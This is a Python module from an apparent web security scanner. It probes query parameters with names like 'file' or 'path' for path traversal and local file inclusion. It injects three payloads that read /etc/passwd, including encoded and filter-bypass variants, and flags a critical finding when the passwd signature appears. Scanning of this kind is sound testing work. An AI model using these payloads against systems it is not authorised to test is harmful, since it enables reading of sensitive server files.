"""Path traversal / local file inclusion probe."""
from __future__ import annotations

from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from core.http_client import HttpClient
from core.reporter import Finding
from . import evidence

PARAM_HINTS = ("file", "path", "page", "doc", "template", "include", "view")

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
]

PASSWD_SIGNATURE = "root:x:0:0:"


def _matches_hint(name: str) -> bool:
    low = name.lower()
    return any(h in low for h in PARAM_HINTS)


def _inject(url: str, key: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    mutated = {k: v[:] for k, v in params.items()}
    mutated[key] = [payload]
    return urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))


async def run(client: HttpClient, pages: list[str]) -> list[Finding]:
    findings: list[Finding] = []
    for page in pages:
        parsed = urlparse(page)
        if not parsed.query:
            continue
        params = parse_qs(parsed.query, keep_blank_values=True)
        targets = [k for k in params if _matches_hint(k)]
        for key in targets:
            for payload in PAYLOADS:
                probe = _inject(page, key, payload)
                resp = await client.get(probe)
                if resp and PASSWD_SIGNATURE in resp.body:
                    findings.append(evidence.from_response(
                        check="traversal",
                        severity="critical",
                        url=probe,
                        detail=f"Path traversal / LFI via parameter '{key}' (read /etc/passwd)",
                        resp=resp,
                        payload=payload,
                    ))
                    break
    return findings
